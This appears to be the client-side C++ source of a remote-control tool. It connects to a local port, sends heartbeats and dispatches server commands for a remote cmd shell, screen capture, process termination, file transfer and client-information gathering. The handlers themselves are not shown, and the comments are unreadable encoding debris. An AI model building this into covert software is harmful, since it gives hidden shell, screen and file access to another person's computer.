// Server.cpp : �������̨Ӧ�ó������ڵ㡣
//
#include "stdafx.h"
#include "Client.h"
#pragma comment(lib, "ws2_32.lib")
extern SOCKET sClient;

//������
void HeartBeat()
{
    bool bRet = false;
    while (true)
    {
        Sleep(20 * 1000);
        bRet = SendData(sClient, CLIENT_HEART, NULL, 0);
        if (!bRet) 
        {
            break;
        }
    }
}

//��ʼ��
void Init()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return;
    }

    //1 ����SOCKET���׽��֣�
    int nRet;
    //TCP
    sClient = socket(AF_INET,
        SOCK_STREAM,//������, ��ʽ
        IPPROTO_TCP);

    //�󶨶˿�1-65535�� IP 0.0.0.0
    sockaddr_in name;
    name.sin_family = AF_INET;
    name.sin_port = htons(9999);
    name.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    int nLength = sizeof(sockaddr_in);

    //4 accept ��������
    char szBuf[256] = { 0 };
    char szBufFmt[256] = { 0 };

    nRet = connect(sClient, (sockaddr*)&name, nLength);

    //
    if (nRet == SOCKET_ERROR) {
        return;
    }

    std::thread* ptd = new std::thread(HeartBeat);
}

void HandleData() 
{
	
	tagPacket pkt;
	char* pData = NULL;

	while (true)
    {
		//��ȡ��ͷ
		bool bRet = RecvData(sClient,
			(char*)&pkt,
			sizeof(tagPacket));
		if (!bRet)
		{
			return;
		}

		if (pkt.nLength > 0) 
        {
			//��ȡ���ĸ�������
		    pData = new char[pkt.nLength];
			bool bRet = RecvData(sClient,
				(char*)pData,
				pkt.nLength);
			if (!bRet)
			{
				return;
			}
		}
	
		//��ʾ�Ѿ��ɹ����յ���һ�����������ʼ���������
		switch (pkt.ucode)
		{
			case SERVER_CREATE_CMD:
			{
				//��ʾ�Ƿ��������͹����Ĵ���CMD������
				OnServerCmd(sClient, pData, pkt.nLength);
			}
			break;

			case SERVER_SEND_COMMAND:
			{
				//��ʾ�Ƿ��������͹�����cmd��������
				OnServerCmdData(sClient, pData, pkt.nLength);
			}
			break;

			case SERVER_CREATE_SCREEN:
			{
				//��ʾ�Ƿ��������͹�������Ļ����
				OnServerScreen(sClient, pData, pkt.nLength);
			}
			break;

			case SERVER_SCREEN_DATA:
			{
				//��ʾ�Ƿ��������͹�������Ļ����
				OnServerScreenData(sClient, pData, pkt.nLength);
			}
			break;

            case SERVER_CREATE_PROCESS:
            {
                //��ʾ�Ƿ��������͹����Ľ�������
                OnServerProcess(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_PROCESS_DATA:
            {
                //��ʾ�Ƿ��������͹����Ľ�������
                OnServerProcessData(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_TERMINATE_PROCESS:
            {
                //��ʾ�Ƿ��������͹����Ľ�������
                OnServerTerminateProcess(sClient, pData, pkt.nLength);
            }
            break; 

            case SERVER_CREATE_FILE:
            {
                //��ʾ�Ƿ��������͹����Ľ�������
                OnServerFile(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_FILE_INIT:
            {
                //��ʾ�Ƿ��������͹����Ľ�������
                OnServerFileInit(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_FILE_DATA:
            {
                //��ʾ�Ƿ��������͹����Ľ�������
                OnServerFileData(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_GET_FILEHEADER:
            {
                //��ʾ�Ƿ��������͹����Ľ�������
                OnServerFileHeader(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_GET_FILE:
            {
                //��ʾ�Ƿ��������͹����Ľ�������
                OnServerFileDownLoad(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_GETCLIENTINFO:
            {
                //��ȡ�ͻ�����Ϣ
                OnServerGetClientInfo(sClient, pData, pkt.nLength);
            }
            break;

		default:
			break;
		}


		if (pData != NULL) 
        {
			delete[] pData;
			pData = NULL;
		}
	}
}

int main()
{

	Init();

    std::thread t(HandleData);

    t.join();

	return 0;
}

